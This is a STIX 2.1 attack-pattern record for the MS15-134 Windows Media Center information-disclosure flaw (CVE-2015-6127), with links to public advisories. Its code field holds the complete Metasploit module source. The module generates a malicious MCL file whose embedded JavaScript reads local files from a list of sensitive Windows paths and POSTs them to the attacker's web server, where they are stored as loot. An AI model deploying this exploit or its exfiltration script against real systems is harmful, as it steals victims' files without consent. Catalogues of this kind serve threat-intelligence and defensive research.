{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f15822c9-9416-4c79-95e1-2dfed7e27770",
    "created": "2024-08-14T16:22:00.369567Z",
    "modified": "2024-08-14T16:22:00.369572Z",
    "name": "MS15-134 Microsoft Windows Media Center MCL Information Disclosure",
    "description": " This module exploits a vulnerability found in Windows Media Center. It allows an MCL file to render itself as an HTML document in the local machine zone by Internet Explorer which can be used to leak files on the target machine.  Please be aware that if this exploit is used against a patched Windows, it can cause the computer to be very slow or unresponsive (100% CPU). It seems to be related to how the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/ms15_134_mcl_leak.rb",
            "external_id": "ms15_134_mcl_leak.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-6127"
        },
        {
            "source_name": "reference",
            "url": "https://blog.coresecurity.com/2015/12/09/exploiting-windows-media-center/"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/advisories/microsoft-windows-media-center-link-file-incorrectly-resolved-reference"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'cgi'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS15-134 Microsoft Windows Media Center MCL Information Disclosure',\n      'Description'    => %q{\n        This module exploits a vulnerability found in Windows Media Center. It allows an MCL\n        file to render itself as an HTML document in the local machine zone by Internet Explorer,\n        which can be used to leak files on the target machine.\n\n        Please be aware that if this exploit is used against a patched Windows, it can cause the\n        computer to be very slow or unresponsive (100% CPU). It seems to be related to how the\n        exploit uses the URL attribute in order to render itself as an HTML file.\n      },\n      'Author'         =>\n        [\n          'Francisco Falcon', # Vuln discovery & PoCs & Detailed write-ups & awesomeness\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2015-6127'],\n          ['MSB', 'MS15-134'],\n          ['URL', 'https://blog.coresecurity.com/2015/12/09/exploiting-windows-media-center/'],\n          ['URL', 'http://www.coresecurity.com/advisories/microsoft-windows-media-center-link-file-incorrectly-resolved-reference']\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2015-12-08',\n    ))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'The MCL file', 'msf.mcl']),\n        OptPath.new('FILES',      [true, 'Files you wish to download', ::File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files_win.txt')])\n      ])\n  end\n\n  def receiver_page\n    @receiver_page_name ||= Rex::Text.rand_text_alpha(5)\n  end\n\n  def js\n    %Q|\nfunction sendFile(fname, data) {\n  var xmlHttp = new XMLHttpRequest();\n  if (!xmlHttp) { return 0; }\n  xmlHttp.open('POST', '#{get_uri}/#{receiver_page}', true);\n  xmlHttp.setRequestHeader('Content-type', 'multipart/form-data');\n  xmlHttp.setRequestHeader('Connection', 'close');\n  var body = 'fname=' + encodeURIComponent(fname) + '&data=' + data.toString();\n  xmlHttp.send(body);\n}\n\nfunction getFile(fname) {\n  var xmlHttp = new ActiveXObject(\"MSXML2.XMLHTTP\");\n  xmlHttp.open('GET', fname, false);\n  xmlHttp.send();\n  return xmlHttp.responseBody.toArray();\n}\n\nvar files = [#{load_file_paths * \",\"}];\n\nfor (var i=0; i < files.length; i++) {\n  try {\n    var data = getFile('file:///' + files[i]);\n    sendFile(files[i], data);\n  } catch (e) {}\n}\n\n    |\n  end\n\n  def generate_mcl\n    %Q|<application url=\"#{datastore['FILENAME']}\">\n<html>\n<head>\n<meta http-equiv=\"x-ua-compatible\" content=\"IE-edge\">\n</head>\n<body>\n<script type=\"text/javascript\">\n#{js}\n</script>\n</body>\n</html>\n</application>\n    |\n  end\n\n  def load_file_paths\n    @files ||= lambda {\n      buf = ''\n      ::File.open(datastore['FILES'], 'rb') do |f|\n        buf = f.read\n      end\n      buf.split.map { |n| \"\\\"#{n.gsub!(/\\\\/, '/')}\\\"\" }\n    }.call\n  end\n\n  def run\n    exploit\n  end\n\n  def start_service(opts = {})\n    super\n    print_status(\"Generating #{datastore['FILENAME']}...\")\n    mcl = generate_mcl\n    file_create(mcl)\n    print_status(\"Pass #{datastore['FILENAME']} to the target you wish to exploit.\")\n    print_status(\"When the MCL is executed, it should start sending data (files) back\")\n    print_status(\"to our web server.\")\n  end\n\n  def is_ie?(request)\n    fp = fingerprint_user_agent(request.headers['User-Agent'])\n    fp[:ua_name] == HttpClients::IE\n  end\n\n  def parse_data(data)\n    buf = ''\n    data.scan(/\\d+/).each do |n|\n      buf << n.to_i.chr\n    end\n    buf\n  end\n\n  def parse_body(body)\n    params = CGI::parse(body)\n\n    {\n      fname: ::File.basename(params['fname'].first),\n      data:  parse_data(params['data'].first)\n    }\n  end\n\n  def on_request_uri(cli, request)\n    unless is_ie?(request)\n      print_error('Client is not Internet Explorer.')\n      send_not_found(cli)\n      return\n    end\n\n    unless /#{receiver_page}/i === request.uri\n      print_error(\"Unknown request: #{request.uri}\")\n      send_not_found(cli)\n      return\n    end\n\n    buff = ''\n\n    print_status(\"Receiving data...\")\n    file = parse_body(request.body.to_s)\n    p = store_loot('mcl.file', 'application/octet-stream', cli.peerhost, file[:data], file[:fname])\n    print_good(\"#{file[:fname]} saved as: #{p}\")\n\n    # If you are kind of lazy to open the saved files, and just sort of want to see the data,\n    # here you go (handy for debugging purposes, but against a larger network this is probably\n    # too much info)\n    vprint_status(\"File collected: #{file[:fname]}\\n\\n#{Rex::Text.to_hex_dump(file[:data])}\")\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-12-08"
}